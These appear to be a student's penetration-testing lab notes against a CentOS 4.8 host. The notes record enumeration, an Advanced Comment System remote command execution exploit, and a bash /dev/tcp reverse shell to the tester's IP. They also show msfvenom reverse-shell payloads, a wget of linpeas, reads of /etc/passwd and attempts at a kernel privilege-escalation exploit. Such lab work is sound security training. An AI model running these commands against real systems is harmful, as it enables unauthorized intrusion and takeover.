```shell
13:14

┌──(root㉿kali)-[/home/kali]
└─# nmap -sC -sV -Pn 10.11.1.8
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-03 13:41 EST
Nmap scan report for 10.11.1.8
Host is up (0.13s latency).
Not shown: 925 filtered tcp ports (no-response), 65 filtered tcp ports (host-prohibited)
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         vsftpd 2.0.1
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: ERROR
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.119.147
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 2.0.1 - secure, fast, stable
|_End of status
22/tcp   open   ssh         OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey: 
|   1024 8994af2e5dc1da8425112c1245c670ac (RSA1)
|   1024 c1c5d1830f4dd89e8f824cbe534b6e14 (DSA)
|_  1024 bce1e6ddab5efdd1212e117cd5b20352 (RSA)
25/tcp   closed smtp
80/tcp   open   http        Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-methods: 
|_  Potentially risky methods: TRACE
| http-robots.txt: 2 disallowed entries 
|_/internal/  /tmp/ 
111/tcp  open   rpcbind     2 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1            785/udp   status
|_  100024  1            788/tcp   status
139/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)
443/tcp  open   ssl/http    Apache httpd 2.0.52 ((CentOS))
|_http-server-header: Apache/2.0.52 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-16T14:03:22
|_Not valid after:  2010-09-16T14:03:22
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_RC2_128_CBC_WITH_MD5
|_ssl-date: 2023-03-03T23:46:12+00:00; +5h00m16s from scanner time.
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
| http-robots.txt: 2 disallowed entries 
|_/internal/  /tmp/ 
| http-methods: 
|_  Potentially risky methods: TRACE
445/tcp  open   netbios-ssn Samba smbd 3.0.33-0.17.el4 (workgroup: MYGROUP)
631/tcp  open   ipp         CUPS 1.1
|_http-server-header: CUPS/1.1
|_http-title: 403 Forbidden
| http-methods: 
|_  Potentially risky methods: PUT
3306/tcp open   mysql?
Service Info: OS: Unix

Host script results:
|_clock-skew: mean: 6h40m15s, deviation: 2h53m11s, median: 5h00m15s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.33-0.17.el4)
|   Computer name: phoenix
|   NetBIOS computer name: 
|   Domain name: 
|   FQDN: phoenix
|_  System time: 2023-03-03T18:45:39-05:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 292.91 seconds

```


```shell
13:20
#dirsearch, nothing too interesting found

┌──(root㉿kali)-[/home/kali]
└─# dirsearch -u http://10.11.1.8:80 -x 400,401,403

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /root/.dirsearch/reports/10.11.1.8-80/_23-03-03_14-15-04.txt

Error Log: /root/.dirsearch/logs/errors-23-03-03_14-15-04.log

Target: http://10.11.1.8:80/

[14:15:05] Starting: 
[14:16:33] 200 -  218B  - /index.html
[14:16:35] 301 -  309B  - /internal  ->  http://10.11.1.8/internal/
[14:16:42] 301 -  307B  - /manual  ->  http://10.11.1.8/manual/
[14:16:42] 200 -    7KB - /manual/index.html
[14:17:02] 200 -   53B  - /robots.txt
```


```shell
# crackmap exec anonymous login worked
┌──(root㉿kali)-[/home/kali/Downloads]
└─# crackmapexec smb 10.11.1.8 -u 'guest' -p ''               
SMB         10.11.1.8       445    PHOENIX          [*] Unix (name:PHOENIX) (domain:PHOENIX) (signing:False) (SMBv1:True)
SMB         10.11.1.8       445    PHOENIX          [-] PHOENIX\guest: STATUS_LOGON_FAILURE 

# able to connect with anonymous logon
┌──(root㉿kali)-[/home/kali/Downloads]
└─# crackmapexec smb 10.11.1.8 -u '' -p ''     
SMB         10.11.1.8       445    PHOENIX          [*] Unix (name:PHOENIX) (domain:PHOENIX) (signing:False) (SMBv1:True)
SMB         10.11.1.8       445    PHOENIX          [+] PHOENIX\: 
┌──(root㉿kali)-[/home/kali/Downloads]
└─# smbmap -u '' -p '' -H 10.11.1.8  

[+] IP: 10.11.1.8:445	Name: 10.11.1.8                                         
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	IPC$                                              	NO ACCESS	IPC Service (Samba Server Version 3.0.33-0.17.el4)

# smb anonymous share identification
┌──(root㉿kali)-[/home/kali/Downloads]
└─# smbclient -L \\\\10.11.1.8 -N         
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba Server Version 3.0.33-0.17.el4)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	MYGROUP              PHOENIX


# enum4 linux 

┌──(root㉿kali)-[/home/kali/Downloads]
└─# enum4linux -S 10.11.1.8                              
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Mar  3 14:49:31 2023

 =========================================( Target Information )=========================================

Target ........... 10.11.1.8
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 10.11.1.8 )=============================


[E] Can't find workgroup/domain



 =====================================( Session Check on 10.11.1.8 )=====================================


[+] Server 10.11.1.8 allows sessions using username '', password ''


 ==================================( Getting domain SID for 10.11.1.8 )==================================

Domain Name: MYGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ===================================( Share Enumeration on 10.11.1.8 )===================================


	Sharename       Type      Comment
	---------       ----      -------
	IPC$            IPC       IPC Service (Samba Server Version 3.0.33-0.17.el4)
Reconnecting with SMB1 for workgroup listing.

	Server               Comment
	---------            -------

	Workgroup            Master
	---------            -------
	MYGROUP              PHOENIX

[+] Attempting to map shares on 10.11.1.8


[E] Can't understand response:

NT_STATUS_NETWORK_ACCESS_DENIED listing \*
//10.11.1.8/IPC$	Mapping: N/A Listing: N/A Writing: N/A
enum4linux complete on Fri Mar  3 14:49:46 2023

```

```shell
# attempted shellshock exploit, says it worked but it did not


┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.8]
└─# python2 shellshock_rce.py payload=bind rhost=10.11.1.8 rport=443 
[-] Trying exploit on : /cgi-sys/entropysearch.cgi
[!] Successfully exploited
[!] Connected to 10.11.1.8
10.11.1.8> [*] 404 on : /cgi-sys/entropysearch.cgi

```

```shell
# back on trying the cups 1.1 exploit, creating reverse shell

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.147 LPORT=4444 -f elf > shell.elf

```

```shell

# found login page need to dig into this with sql.

http://10.11.1.8/internal/index.php/login#ACS_Comments_Container

# looked up search sploit for advanced comment system
```


![[1 searchsploit advanced comment system.png]]
```shell
┌──(root㉿kali)-[/home/kali]
└─# searchsploit advanced comment
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                             |  Path
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Advanced Comment System 1.0 - 'ACS_path' Path Traversal                                                                                                                                                    | php/webapps/49343.txt
Advanced Comment System 1.0 - Multiple Remote File Inclusions                                                                                                                                              | php/webapps/9623.txt
Advanced Comment System 1.0 - SQL Injection                                                                                                                                                                | php/webapps/45853.txt
WordPress Plugin WP Advanced Comment 0.10 - Persistent Cross-Site Scripting                                                                                                                                | php/webapps/39548.txt
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                                                                                                                                                                                                                             
┌──(root㉿kali)-[/home/kali]

```

![[2 sql injection line.png]]
```shell
#tried sql injection string and it worked

http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=[shell.txt?]
```


![[3 on ACS administration page.png]]

```shell
# can't really do anything with the sql injection exploit, trying a different one.

/advanced_comment_system/index.php?ACS_path=[shell.txt?]
                                   /advanced_comment_system/admin.php?ACS_path=[shell.txt?]
```

![[4 2nd exploit attempt.png]]


```shell
# tried this, failed.

http://10.11.1.8/internal/advanced_comment_system/admin.php?pw=admin?file=http://192.168.119.147:80/php_reverse.php
```

```shell
# exploit that allows for remote code execution

https://packetstormsecurity.com/files/165108/Advanced-Comment-System-1.0-Remote-Command-Execution.html

```

![[5 modified RCE working exploit.png]]

```shell

# working exploit commands
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.8]
└─# python3 ACS1.0_RCE.py whoami 
apache

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.8]
└─# python3 ACS1.0_RCE.py ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:86:20:CB  
          inet addr:10.11.1.8  Bcast:10.11.255.255  Mask:255.255.0.0
          inet6 addr: fe80::250:56ff:fe86:20cb/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:519114 errors:0 dropped:0 overruns:0 frame:0
          TX packets:501781 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:58644680 (55.9 MiB)  TX bytes:264904271 (252.6 MiB)
          Interrupt:185 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:1372 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1372 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:99212 (96.8 KiB)  TX bytes:99212 (96.8 KiB)

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.8]
└─# python3 ACS1.0_RCE.py uname -a                                       
Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux


# going to try to setup reverse shell with RCE



```

```shell

┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.8]
└─# python3 ACS1.0_RCE.py 'bash -i >& /dev/tcp/192.168.119.147/443 0>&1'

# nc listener, on box
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.8]
└─# nc -lvnp 443 
listening on [any] 443 ...
connect to [192.168.119.147] from (UNKNOWN) [10.11.1.8] 32939
bash: no job control in this shell
bash-3.00$ whoami
apache
bash-3.00$ ifconfig
eth0      Link encap:Ethernet  HWaddr 00:50:56:86:20:CB  
          inet addr:10.11.1.8  Bcast:10.11.255.255  Mask:255.255.0.0
          inet6 addr: fe80::250:56ff:fe86:20cb/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:522840 errors:0 dropped:0 overruns:0 frame:0
          TX packets:502002 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:58942644 (56.2 MiB)  TX bytes:264943870 (252.6 MiB)
          Interrupt:185 Base address:0x2000 

```

![[6 exploit and reverse shell.png]]

![[7 working reverse shell.png]]


```shell
# beginning enumeration

# /etc/passwd

bash-3.00$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpm:x:37:37::/var/lib/rpm:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash


# ip route
bash-3.00$ ip route 
10.11.0.0/16 dev eth0  proto kernel  scope link  src 10.11.1.8 
169.254.0.0/16 dev eth0  scope link 
default via 10.11.0.1 dev eth0 

# cat /etc/crontab
bash-3.00$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root
HOME=/

01 * * * * root run-parts /etc/cron.hourly
02 4 * * * root run-parts /etc/cron.daily
22 4 * * 0 root run-parts /etc/cron.weekly
42 4 1 * * root run-parts /etc/cron.monthly

# cat /etc/issue
bash-3.00$ cat /etc/issue
CentOS release 4.8 (Final)
Kernel \r on an \m

# found exploit https://www.exploit-db.com/exploits/9545 to priv esc with this kernel version

# uname -a
bash-3.00$ uname -a
Linux phoenix 2.6.9-89.EL #1 Mon Jun 22 12:19:40 EDT 2009 i686 athlon i386 GNU/Linux


```

```shell


#hosting http web server
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# python3 -m http.server 80 
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.11.1.8 - - [03/Mar/2023 20:53:38] "GET /linpeas.sh HTTP/1.0" 200 -

#linpeas transfer - file transfer linux
bash-3.00$ wget 192.168.119.147/linpeas.sh
--01:54:12--  http://192.168.119.147/linpeas.sh
           => `linpeas.sh'
Connecting to 192.168.119.147:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 828,087 (809K) [text/x-sh]

    0K .......... .......... .......... .......... ..........  6%   95.49 KB/s
   50K .......... .......... .......... .......... .......... 12%  107.31 KB/s
  100K .......... .......... .......... .......... .......... 18%  106.88 KB/s
  150K .......... .......... .......... .......... .......... 24%  118.98 KB/s
  200K .......... .......... .......... .......... .......... 30%  134.17 KB/s
  250K .......... .......... .......... .......... .......... 37%   89.91 KB/s
  300K .......... .......... .......... .......... .......... 43%  140.30 KB/s
  350K .......... .......... .......... .......... .......... 49%  135.33 KB/s
  400K .......... .......... .......... .......... .......... 55%  384.80 KB/s
  450K .......... .......... .......... .......... .......... 61%  113.34 KB/s
  500K .......... .......... .......... .......... .......... 68%  113.60 KB/s
  550K .......... .......... .......... .......... .......... 74%  374.27 KB/s
  600K .......... .......... .......... .......... .......... 80%  148.29 KB/s
  650K .......... .......... .......... .......... .......... 86%  184.84 KB/s
  700K .......... .......... .......... .......... .......... 92%  349.28 KB/s
  750K .......... .......... .......... .......... .......... 98%  198.83 KB/s
  800K ........                                              100%  195.56 KB/s

01:54:18 (141.29 KB/s) - `linpeas.sh' saved [828087/828087]

bash-3.00$ ls
linpeas.sh
bash-3.00$ ls -la
total 832
drwxrwxrwt   2 root   root     4096 Mar  4 01:54 .
drwxr-xr-x  23 root   root     4096 Sep  1  2022 ..
-rw-r--r--   1 apache apache 828087 Jan 31 00:15 linpeas.sh
bash-3.00$ chmod +x linpeas.sh
bash-3.00$ ls
linpeas.sh
bash-3.00$ ls -la
total 832
drwxrwxrwt   2 root   root     4096 Mar  4 01:54 .
drwxr-xr-x  23 root   root     4096 Sep  1  2022 ..
-rwxr-xr-x   1 apache apache 828087 Jan 31 00:15 linpeas.sh


```

```shell
# ran linpeas, check linpeas notes on left.

# compiled local priv esc code, xferring to victim
┌──(root㉿kali)-[/home/kali/Documents/offsec_labs/10.11.1.8]
└─# gcc 9545_local_priv.c -o 9545_local_priv   

# unable to properly compile, pulled a pre compiled file onto box
# pre compiled exploit still not working..
-rwxr-xr-x   1 apache apache 7012 Mar  3 21:26 9545_pre
bash-3.00$ ./9545_pre

```

```shell
#going to try to get an msfvenom shell so its better.

msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.119.147 LPORT=3563 -f elf > shell.elf


wget 192.168.119.147/exploit


# spent hours trying to compile the exploit, i am take a break for the day
# exploit tried. https://www.exploit-db.com/exploits/9545
```